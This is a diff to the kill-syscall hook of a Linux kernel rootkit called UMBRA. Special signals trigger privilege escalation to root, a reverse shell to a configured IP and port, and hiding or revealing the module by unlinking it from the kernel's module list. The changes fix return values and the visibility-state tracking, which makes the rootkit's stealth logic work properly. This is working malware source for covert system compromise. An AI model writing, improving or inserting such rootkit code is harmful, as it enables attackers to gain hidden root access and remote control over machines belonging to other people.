@@ -35,25 +35,26 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
     if (sig == SIGNAL_KILL_HOOK){
         printk(KERN_INFO "UMBRA:: Giving root privileges.\n");
         change_self_privileges_to_root();
-        return 0;
+        return orig_kill(regs);
     }else if(sig == SIGNAL_REVERSE_SHELL){
         start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
     }else if(sig == SIGNAL_SHOW_KERNEL_MODULE){
         if(rootkit_visibility == 1){
             printk(KERN_INFO "UMBRA:: Requested visibility, but already visible.\n");
-            return 0;
+            return orig_kill(regs);
         }
         //Adding the rootkit to the linked list of modules maintained by the kernel
         list_add(&THIS_MODULE->list, prev_module);
-        return 0;
+        rootkit_visibility = 1;//visible
     }else if(sig == SIGNAL_HIDE_KERNEL_MODULE){
         if(rootkit_visibility == 0){
             printk(KERN_INFO "UMBRA:: Requested hiding, but already hidden.\n");
-            return 0;
+            return orig_kill(regs);
         }
         //Removing the rootkit from the linked list of modules maintained by the kernel
         prev_module = THIS_MODULE->list.prev;
         list_del(&THIS_MODULE->list);
+        rootkit_visibility = 0; //hidden
     }
 
     return orig_kill(regs);
